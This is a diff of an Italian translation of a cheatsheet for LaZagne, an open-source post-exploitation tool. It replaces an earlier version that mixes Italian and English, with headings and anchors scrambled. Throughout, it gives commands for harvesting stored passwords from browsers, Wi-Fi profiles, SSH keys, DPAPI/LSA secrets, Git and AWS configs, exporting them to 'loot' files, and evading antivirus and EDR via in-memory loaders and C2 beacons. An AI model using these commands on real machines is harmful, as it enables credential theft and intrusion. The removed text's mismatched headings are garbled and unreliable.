@@ -1,42 +1,45 @@
-# 🔍 LaZagne - Scheda di riferimento completa
-
 <!-- language-home-navigation -->
-[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[LaZagne](https://github.com/AlessandroZ/LaZagne) is an open-source post-exploitation application used to retrieve passwords stored on a local computer. It supports Windows, Linux, and macOS across multiple categories including web browsers, email clients, Wi-Fi networks, database management software, sysadmin tools, and memory caches.
-
----
-
-## 📋 Indice
-
-- [[Targeted Category Attacks](#targeted-category-attacks)](#supported-modules--categories)
-- [Installazione](#installation--binaries)
-- [Installazione](#linux-credential-harvesting)
-- [Windows Credential Harvesting](#windows-credential-harvesting)
-- [Targeted Category Attacks](#targeted-category-attacks)
-- [Output Formats & File Export](#output-formats--file-export)
-- [Export to Plain Text](#operational-security--edr-avoidance)
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [Targeted Category Attacks](#targeted-category-attacks)
 
-[Operational Security & EDR Avoidance](#operational-security--edr-avoidance)
-- **Browsers**: Chrome, Firefox, Edge, Opera, Brave, Chromium (history, autofill, cookies, credentials).
-- **Sysadmin Tools**: WinSCP, PuTTY, OpenSSH (`id_rsa` keys / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
-- **Databases**: DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
-- **Wi-Fi**: Stored WPA2/WPA3 pre-shared keys (PSK) in OS network profiles.
-- **Developer & VCS**: Git credentials (`.git-credentials`, cache), SVN, Docker tokens, AWS CLI credentials.
-- **Email & Chat**: Thunderbird, Outlook, Pidgin, Skype.
-- **Windows Vault & DPAPI**: LSA secrets, DPAPI master keys, Credential Manager vault items.
+# LaZagne Cheatsheet
+
+[LaZagne](https://github.com/AlessandroZ/LaZagne) è un'applicazione post-exploitation open source utilizzata per recuperare le password archiviate su un computer locale. Supporta Windows, Linux e macOS in più categorie tra cui browser Web, client di posta elettronica, reti Wi-Fi, software di gestione di database, strumenti di amministrazione di sistema e cache di memoria.
 
 ---
 
-## Installazione
+## Sommario
 
+- [Moduli e categorie supportati](#moduli-supportati--categorie)
+- [Installazione e binari](#installazione--binari)
+- [Raccolta di credenziali Linux](#linux-credential-harvesting)
+- [Raccolta di credenziali Windows](#windows-credential-harvesting)
+- [Attacchi di categoria mirata](#attacchi-di-categoria-mirata)
+- [Formati di output ed esportazione di file](#formati-output--esportazione-file)
+- [Sicurezza operativa e prevenzione EDR](#sicurezza-operativa--edr-avoidance)
+
+---
+
+## Moduli e categorie supportati
+
+LaZagne estrae credenziali da decine di applicazioni raggruppate in categorie:
+- **Browser:** Chrome, Firefox, Edge, Opera, Brave, Chromium (cronologia, compilazione automatica, cookie, credenziali).
+- **Strumenti di amministrazione di sistema:** WinSCP, PuTTY, OpenSSH (chiavi/configurazione `id_rsa`), RDP/mstsc, FileZilla, Cyberduck, VNC.
+- **Database:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
+- **Wi-Fi:** Chiavi precondivise WPA2/WPA3 (PSK) memorizzate nei profili di rete del sistema operativo.
+- **Sviluppatore e VCS:** Credenziali Git (`.git-credentials`, cache), SVN, token Docker, credenziali AWS CLI.
+- **E-mail e chat:** Thunderbird, Outlook, Pidgin, Skype.
+- **Windows Vault e DPAPI:** segreti LSA, chiavi master DPAPI, elementi del vault di Credential Manager.
+
+---
+
+## Installazione e file binari
 ```bash
 # Clone the repository
 git clone https://github.com/AlessandroZ/LaZagne.git
@@ -49,56 +52,49 @@ pip install -r requirements.txt
 # Windows: lazagne.exe
 # Linux: laZagne.py
 ```
-
 ---
 
-## Installazione
+## Raccolta delle credenziali Linux
 
-### 1. Run All Extraction Modules
+### 1. Esegui tutti i moduli di estrazione
 ```bash
 python3 laZagne.py all
 ```
-
-### 2. Run with Root / Sudo Privileges (Expands Shadow & Keyring Access)
-Linux Credential Harvesting
+### 2. Esegui con privilegi Root/Sudo (espande l'accesso Shadow e Keyring)
+L'esecuzione come `root` sblocca i segreti di sistema, i profili Wi-Fi in `/etc/NetworkManager` e le chiavi SSH in tutte le directory `/home/*`:
 ```bash
 sudo python3 laZagne.py all
 ```
-
-### 3. Extract Passwords from Gnome Keyring / KWallet
+### 3. Estrai le password dal portachiavi Gnome / KWallet
 ```bash
 python3 laZagne.py sysadmin -k
 ```
-
 ---
 
-## Windows Credential Harvesting
+## Raccolta delle credenziali di Windows
 
-On Windows, use the standalone executable `lazagne.exe`:
+Su Windows, utilizzare l'eseguibile autonomo `lazagne.exe`:
 
-### 1. Extract All Stored Passwords
+### 1. Estrai tutte le password memorizzate
 ```cmd
 lazagne.exe all
 ```
-
-### 2. Run with Elevated Privileges (Admin / SYSTEM)
-On Windows, use the standalone executable `lazagne.exe`:
+### 2. Esegui con privilegi elevati (Amministratore/SISTEMA)
+Estrai le chiavi master DPAPI, i segreti LSA e le credenziali del dominio memorizzato nella cache:
 ```cmd
 lazagne.exe all -v
 ```
-
-### 3. Extract Passwords for a Specific User (When Running as Admin)
+### 3. Estrarre le password per un utente specifico (quando si esegue come amministratore)
 ```cmd
 lazagne.exe all -path "C:\Users\TargetUser\AppData"
 ```
-
 ---
 
-## Targeted Category Attacks
+## Attacchi di categoria mirati
 
-Instead of running all modules, specify target software categories to minimize disk activity and noise:
+Invece di eseguire tutti i moduli, specifica le categorie del software di destinazione per ridurre al minimo l'attività e il rumore del disco:
 
-### 1. Web Browsers Only
+### 1. Solo browser Web
 ```bash
 # Linux
 python3 laZagne.py browsers
@@ -106,8 +102,7 @@ python3 laZagne.py browsers
 # Windows
 lazagne.exe browsers
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 2. Password Wi-Fi in chiaro
 ```bash
 # Linux (requires root or sudo)
 sudo python3 laZagne.py wifi
@@ -115,8 +110,7 @@ sudo python3 laZagne.py wifi
 # Windows
 lazagne.exe wifi
 ```
-
-### 1. Web Browsers Only
+### 3. Strumenti di amministrazione di sistema e di accesso remoto (SSH, RDP, WinSCP, FileZilla)
 ```bash
 # Linux
 python3 laZagne.py sysadmin
@@ -124,8 +118,7 @@ python3 laZagne.py sysadmin
 # Windows
 lazagne.exe sysadmin
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 4. Client del database
 ```bash
 # Linux
 python3 laZagne.py databases
@@ -133,40 +126,38 @@ python3 laZagne.py databases
 # Windows
 lazagne.exe databases
 ```
-
-### 3. Sysadmin & Remote Access Tools (SSH, RDP, WinSCP, FileZilla)
+### 5. Credenziali sviluppatore e Git
 ```bash
 # Linux
 python3 laZagne.py git
 ```
-
 ---
 
-## Output Formats & File Export
+## Formati di output ed esportazione di file
 
-Save harvested credentials directly to disk in structured formats:
+Salva le credenziali raccolte direttamente su disco in formati strutturati:
 
-### Export to JSON Format
+### Esporta in formato JSON
 ```bash
 python3 laZagne.py all -oJ -oN /tmp/loot_credentials
 ```
-Output Formats & File Export
+Crea `/tmp/loot_credentials.json` contenente credenziali strutturate, URL, nomi utente e password in testo semplice.
 
-### Save harvested credentials directly to disk in structured formats:
+### Esporta in testo semplice
 ```bash
 python3 laZagne.py all -oT -oN /tmp/loot_credentials
 ```
-Export to JSON Format
+Crea `/tmp/loot_credentials.txt`.
 
 ---
 
-## Export to Plain Text
+## Sicurezza operativa ed prevenzione degli EDR
 
-- **Antivirus Detection**: Standalone `lazagne.exe` is heavily signatured by Windows Defender and commercial EDR solutions.
-- **Obfuscation & In-Memory Execution**: 
-  - Execute via PowerShell reflection or in-memory loaders (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
-  - Use Python source version with a custom virtual environment rather than the packed PyInstaller binary.
-- **Clean Artifacts**: Delete temporary loot files or redirect output directly through standard out over an encrypted C2 beacon or SSH session:
+- **Rilevamento antivirus:** `lazagne.exe` autonomo è fortemente firmato da Windows Defender e da soluzioni EDR commerciali.
+- **Offuscamento ed esecuzione in memoria:**
+  - Esegui tramite riflessione PowerShell o caricatori in memoria (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
+  - Utilizzare la versione sorgente Python con un ambiente virtuale personalizzato anziché il binario PyInstaller compresso.
+- **Pulisci gli artefatti:** elimina i file di bottino temporanei o reindirizza l'output direttamente tramite l'uscita standard su un beacon C2 crittografato o una sessione SSH:
   ```bash
   ssh victim@192.168.1.50 'python3 -' < laZagne.py all
   ```
